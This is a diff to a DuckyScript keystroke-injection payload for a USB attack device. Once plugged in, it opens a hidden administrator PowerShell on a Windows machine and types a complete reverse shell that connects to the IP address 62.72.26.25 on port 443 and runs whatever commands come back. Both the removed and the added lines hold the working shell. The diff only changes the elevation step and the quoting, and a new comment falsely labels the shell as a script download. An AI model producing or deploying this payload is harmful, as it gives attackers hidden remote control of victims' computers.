@@ -1,12 +1,10 @@
 DELAY 2000
 GUI r
 DELAY 500
-REM Open PowerShell without a visible window
-STRING powershell -WindowStyle Hidden
+REM Open PowerShell as administrator
+STRING powershell Start-Process powershell -WindowStyle Hidden -Verb runAs
 ENTER
 DELAY 500
-REM Elevate to administrator (without visible UAC)
-STRING Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command "& {Start-Process PowerShell -ArgumentList ''-NoProfile -WindowStyle Hidden -Command \"& {'
-DELAY 100
-STRING $client = New-Object System.Net.Sockets.TCPClient('62.72.26.25',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();exit;"' -Verb RunAs}'
+REM Download the PowerShell script
+STRING $client = New-Object System.Net.Sockets.TCPClient('62.72.26.25',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();exit;
 ENTER
